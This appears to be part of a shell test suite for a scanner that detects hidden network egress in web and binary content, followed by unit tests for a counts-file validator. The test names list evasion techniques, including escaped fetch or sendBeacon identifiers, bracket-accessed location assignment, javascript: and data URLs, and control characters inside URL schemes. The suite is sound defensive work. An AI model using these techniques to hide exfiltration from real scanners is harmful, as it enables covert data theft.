check_count "regex after export declaration stays visible"     1 1 "$T/r8regexexportasi"
check_count "regex after break ASI stays visible"              1 1 "$T/r8regexbreakasi"
check_count "regex after continue ASI stays visible"           1 1 "$T/r8regexcontinueasi"
check_count "regex after exported class stays visible"         1 1 "$T/r8regexexportclass"
check_count "regex after exported function stays visible"      1 1 "$T/r8regexexportfunction"
check_count "regex after export-default function stays visible" 1 1 "$T/r8regexexportdefaultfunction"
check_count "regex after optional-binding catch stays visible"  1 1 "$T/r8regexcatchblock"
check_count "regex after TS interface stays visible"            1 1 "$T/r8regextsinterface"
check_count "regex after TS enum stays visible"                 1 1 "$T/r8regextsenum"
check_count "regex after TS namespace stays visible"            1 1 "$T/r8regextsnamespace"
check "line comment after control close stays inert"           0 "" "$T/r8iflinecontrol"
check "block comment after block close stays inert"            0 "" "$T/r8blockcommentcontrol"
check_count "WHATWG one-slash HTTPS is caught"                 1 1 "$T/r8httpsone"
check_count "WHATWG zero-slash HTTPS is caught"                1 1 "$T/r8httpszero"
check "binary one-slash HTTPS survives waiver as egress"       1 "EGRESS(binary)" --allow-binary '*' "$T/r8httpsonebin"
check "binary zero-slash HTTPS survives waiver as egress"      1 "EGRESS(binary)" --allow-binary '*' "$T/r8httpszerobin"
check "binary hyphen-host HTTPS survives waiver as egress"     1 "EGRESS(binary)" --allow-binary '*' "$T/r8httpshyphenbin"
check "binary underscore-host HTTPS survives waiver as egress" 1 "EGRESS(binary)" --allow-binary '*' "$T/r8httpsunderbin"
check "binary bang-host HTTPS survives waiver as egress"       1 "EGRESS(binary)" --allow-binary '*' "$T/r8httpsbangbin"
check_count "explicit HTML treats polyglot markup as active"   1 1 "$T/r8polyhtml"
check "explicit JavaScript keeps markup string inert"          0 "" "$T/r8polyjs"
check_count "unknown media resolves HTML-JS ambiguity closed"  1 1 "$T/r8polyunknown"
check "data and blob targets stay local controls"              0 "" "$T/r8localopaque"
check_count "executable data HTML is scanned as nested markup" 1 1 "$T/r8datahtml"
check "nested data HTML local path stays clean"                 0 "" "$T/r8datahtmllocal"
check_count "Worker data JavaScript is scanned recursively"     1 1 "$T/r8dataworker"
check_count "SharedWorker data JavaScript is scanned"           1 1 "$T/r8datasharedworker"
check_count "dynamic-import data JavaScript is scanned"         1 1 "$T/r8dataimport"
check_count "importScripts data JavaScript is scanned"          1 1 "$T/r8dataimportscripts"
check_count "base64 executable Worker data fails closed"        1 1 "$T/r8dataworkerbase64"
check_count "link data HTML navigation is scanned"              1 1 "$T/r8datalink"
check_count "window.open data HTML navigation is scanned"       1 1 "$T/r8datawindowopen"
check_count "location data HTML navigation is scanned"          1 1 "$T/r8datalocation"
check_count "generic src data HTML is scanned"                  1 1 "$T/r8dataframesrc"
check_count "static-import data JavaScript is scanned"          1 1 "$T/r8datastaticimport"
check "unquoted CSS blob target stays local"                    0 "" "$T/r8cssblob"
check "unquoted CSS data target stays local"                    0 "" "$T/r8cssdata"
check "dynamic blob template target stays local"                0 "" "$T/r8dynamicblob"
check "same-origin path containing https token stays local"     0 "" "$T/r8localhttpspath"
check "dot-relative path containing https token stays local"    0 "" "$T/r8localhttpsdot"
check_count "script src data JavaScript is scanned"             1 1 "$T/r8datascriptsrc"
check_count "setAttribute src data JavaScript is scanned"       1 1 "$T/r8datasettersrc"
check_count "data CSS import is scanned recursively"            1 1 "$T/r8datacssimport"
check "same-origin path containing stun token stays local"      0 "" "$T/r8localstunpath"
check "relative path containing turn token stays local"         0 "" "$T/r8localturnpath"
check_count "raw TAB in HTML URL scheme is normalized"          1 1 "$T/r8htmlrawtab"
check_count "entity TAB in HTML URL scheme is normalized"       1 1 "$T/r8htmlentitytab"
check_count "meta-refresh TAB URL scheme is normalized"         1 1 "$T/r8metatab"
check_count "JavaScript hex escape is decoded before fetch"     1 1 "$T/r8jshexescape"
check_count "JavaScript Unicode escape is decoded before fetch" 1 1 "$T/r8jsunicodeescape"
check_count "JavaScript line continuation is decoded"           1 1 "$T/r8jslinecontinuation"
check_count "globalThis bracket fetch is caught"                1 1 "$T/r8bracketglobalfetch"
check_count "navigator bracket sendBeacon is caught"            1 1 "$T/r8bracketbeacon"
check_count "chained bracket location assign is caught"         1 1 "$T/r8bracketlocassign"
check_count "modulepreload data JavaScript is scanned"          1 1 "$T/r8datamodulepreload"
check_count "meta-refresh data HTML is scanned"                 1 1 "$T/r8datametarefresh"
check_count "oversized executable data payload fails closed"    1 1 "$T/r8dataoversize"
check_count "stray quote cannot promote comment opener"         1 1 "$T/r8strayquotecomment"
check_count "stray quote cannot promote script opener"          1 1 "$T/r8strayquotescript"
check_count "stray quote cannot hide script end tag"            1 1 "$T/r8scriptendstrayquote"
check_count "stray quote cannot hide style end tag"             1 1 "$T/r8styleendstrayquote"
check_count "self bracket fetch is caught"                       1 1 "$T/r8selfbracketfetch"
check_count "bracket location dot-assign is caught"             1 1 "$T/r8bracketlocdotassign"
check_count "escaped fetch identifier is normalized"            1 1 "$T/r8escapedfetchident"
check_count "escaped sendBeacon identifier is normalized"       1 1 "$T/r8escapedbeaconident"
check_count "first-char escaped fetch identifier is normalized" 1 1 "$T/r8escapedfirstfetch"
check_count "escaped global fetch identifier is normalized"     1 1 "$T/r8escapedglobalfetch"
check_count "first-char escaped beacon is normalized"           1 1 "$T/r8escapedfirstbeacon"
check_count "first-char escaped location is normalized"         1 1 "$T/r8escapedfirstlocation"
check_count "escaped window location is normalized"             1 1 "$T/r8escapedwindowlocation"
check_count "globalThis location assignment is caught"          1 1 "$T/r8globalthislocation"
check_count "self location assignment is caught"                1 1 "$T/r8selflocation"
check_count "top bracket location assignment is caught"         1 1 "$T/r8topbracketlocation"
check_count "parent location assignment is caught"              1 1 "$T/r8parentlocation"
check_count "leading decoded NUL is URL-trimmed"                 1 1 "$T/r8leadingnulurl"
check_count "leading decoded SOH is URL-trimmed"                 1 1 "$T/r8leadingsohurl"
check_count "leading decoded backspace is URL-trimmed"           1 1 "$T/r8leadingbackspaceurl"
check_count "leading decoded SOH before network path is trimmed" 1 1 "$T/r8leadingsohnetwork"
check "interior numeric control cannot synthesize a scheme"      0 "" "$T/r8interiorentityscheme"
check "interior numeric control cannot synthesize network path"  0 "" "$T/r8interiorentitynetwork"
check "interior numeric control meta URL stays local"            0 "" "$T/r8interiorentitymeta"
check_count "leading numeric control is URL-trimmed"             1 1 "$T/r8leadingentitycontrol"
check_count "application x-javascript data script is scanned"    1 1 "$T/r8legacyxjavascript"
check_count "text javascript1.5 data import is scanned"          1 1 "$T/r8legacyjavascript15"
check_count "text x-javascript modulepreload is scanned"         1 1 "$T/r8legacytextxjavascript"
check "data script fragment is not executable payload"           0 "" "$T/r8datafragmentcontrol"
check_count "data import query remains executable payload"       1 1 "$T/r8dataquerycontrol"
check "modulepreload fragment is not executable payload"         0 "" "$T/r8modulefragmentcontrol"
check_count "percent-encoded URL metadata stays payload"         1 1 "$T/r8encodedurlmetadata"
check_count "regex after anonymous export class stays visible"   1 1 "$T/r8regexexportanonclass"
check_count "regex after anonymous export function stays visible" 1 1 "$T/r8regexexportanonfunction"
check_count "regex after anonymous export generator stays visible" 1 1 "$T/r8regexexportanongenerator"
check_count "regex after anonymous export async stays visible"   1 1 "$T/r8regexexportanonasync"
check_count "anchor javascript URL payload is scanned"           1 1 "$T/r8javascriptanchor"
check_count "iframe javascript URL payload is scanned"           1 1 "$T/r8javascriptiframe"
check_count "meta javascript URL payload is scanned"             1 1 "$T/r8javascriptmeta"
check_count "window open javascript URL payload is scanned"      1 1 "$T/r8javascriptopen"
check_count "location assign javascript URL is scanned"          1 1 "$T/r8javascriptlocationassign"
check_count "location replace javascript URL is scanned"         1 1 "$T/r8javascriptlocationreplace"
check_count "direct location javascript URL is scanned"          1 1 "$T/r8javascriptdirectlocation"
check_count "href property javascript URL is scanned"            1 1 "$T/r8javascripthrefprop"
check_count "src property javascript URL is scanned"             1 1 "$T/r8javascriptsrcprop"
check_count "setAttribute href javascript URL is scanned"        1 1 "$T/r8javascriptsethref"
check_count "setAttribute src javascript URL is scanned"         1 1 "$T/r8javascriptsetsrc"
check "ordinary javascript URL string stays inert"               0 "" "$T/r8javascriptstringcontrol"
check "non-fetching data-note javascript URL stays inert"        0 "" "$T/r8javascriptdatacontrol"
check "setAttribute title javascript URL stays inert"            0 "" "$T/r8javascriptsettitlecontrol"
check_count "optional location assign is caught"                 1 1 "$T/r8optionallocationassign"
check_count "optional location bracket replace is caught"       1 1 "$T/r8optionallocationbracket"
check_count "optional window location assign is caught"         1 1 "$T/r8optionalwindowassign"
check_count "optional window location bracket is caught"        1 1 "$T/r8optionalwindowbracket"
check_count "optional global bracket location is caught"        1 1 "$T/r8optionalglobalbracket"
check "optional location property without call stays inert"      0 "" "$T/r8optionalpropertycontrol"
check "replace object key without call stays inert"              0 "" "$T/r8optionalkeycontrol"

# S1: unit-test the REAL trusted-counts validator lifted from the shipped scanner. A honest canonical
# record is accepted; every producer/runtime fault (leading-zero/octal, overflow, extra line, no
# trailing newline, trailing garbage, NUL, wrong arity, non-ASCII) is REJECTED so the gate fails closed.
CFNS="$(mktemp)"
awk '
  $0 ~ /^is_canon_count\(\) \{/ {p=1}
  $0 ~ /^validate_counts_file\(\) \{/ {p=1}
  p {print}
  p && $0=="}" {p=0}
' "$SCAN" > "$CFNS"
# shellcheck source=/dev/null
. "$CFNS"
CT="$(mktemp -d)"
counts_accepts() { printf '%b' "$2" > "$CT/c"; if validate_counts_file "$CT/c" >/dev/null; then ok "$1"; else no "$1 (rejected a canonical record)"; fi; }
counts_rejects() { printf '%b' "$2" > "$CT/c"; if validate_counts_file "$CT/c" >/dev/null; then no "$1 (accepted a fault -> would fail OPEN)"; else ok "$1"; fi; }
counts_accepts "S1 counts accept 0 0 0"          '0 0 0\n'
counts_accepts "S1 counts accept 3 1 2"          '3 1 2\n'
counts_accepts "S1 counts accept 9-digit max"    '999999999 0 0\n'
counts_rejects "S1 counts reject leading-zero 08" '08 0 0\n'
counts_rejects "S1 counts reject overflow"       '99999999999999999999 0 0\n'
counts_rejects "S1 counts reject 10-digit field" '1000000000 0 0\n'
counts_rejects "S1 counts reject extra line"     '0 0 0\n99 0 0\n'
counts_rejects "S1 counts reject no newline"     '0 0 0'
counts_rejects "S1 counts reject trailing junk"  '0 0 0\nx'
counts_rejects "S1 counts reject embedded NUL"   '0 0 0\000\n'
counts_rejects "S1 counts reject 2 fields"       '0 0\n'
counts_rejects "S1 counts reject 4 fields"       '0 0 0 0\n'
counts_rejects "S1 counts reject non-ASCII"      '0 0 \303\251\n'
rm -rf "$CT" "$CFNS"

echo
echo "RESULT pass=$pass fail=$fail"
[ "$fail" -eq 0 ]
